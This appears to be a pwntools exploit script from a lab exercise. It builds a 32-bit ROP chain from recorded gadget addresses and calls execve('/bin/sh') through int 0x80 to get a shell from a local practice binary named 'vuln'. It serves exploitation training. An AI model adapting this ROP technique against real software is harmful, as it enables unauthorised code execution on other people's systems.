# sudo apt install gdb gdbserver
# pip3 install pwn

from pwn import *

################## addresses #########################

RET_ADDRESS = 0x8049047 
# gef➤  grep "/bin/sh"
# [+] Searching '/bin/sh' in memory
# [+] In '/home/user/Desktop/VDSI/32_BIT_ROP/vuln'(0x804c000-0x804d000), permission=rw-
#   0x804c00c - 0x804c013  →   "/bin/sh"

BIN_SH = 0x804c00c

# STATIC ELF
# 
# (vuln/ELF/x86)> search pop
# [INFO] Searching for gadgets: pop
# 
# [INFO] File: vuln
# 0x0804900e: pop eax; ret;
# 0x08049019: pop ebp; ret;
# 0x08049012: pop ebx; ret;
# 0x08049014: pop ecx; ret;
# 0x08049016: pop edx; ret;
#
# (vuln/ELF/x86)> search int
# 
# 0x0804903f: int 0x80;

POP_EAX = 0x0804900e
POP_EBX = 0x08049012
POP_ECX = 0x08049014
POP_EDX = 0x08049016
INT_80  = 0x0804903f

################## exploit ##########################

context.terminal = ["tmux", "splitw", "-h"]

p = process("./vuln")
gdb.attach(p, f'''
b *{RET_ADDRESS}
''')

# p = gdb.debug('./vuln', f'''
# # break at main
# break *{RET_ADDRESS}

# # debug automatically breaks at _start - ignore it
# # continue
# ''')

exploit = b""
exploit += p32(POP_EAX)
exploit += p32(0x0b)
exploit += p32(POP_EBX)
exploit += p32(BIN_SH)
exploit += p32(POP_ECX)
exploit += p32(0)
exploit += p32(POP_EDX)
exploit += p32(0)
exploit += p32(INT_80)

# p.send(b"A"*80 + b"B"*4 + b"C"*4)
p.send(b"A"*80 + b"B"*4 + exploit)

p.interactive()
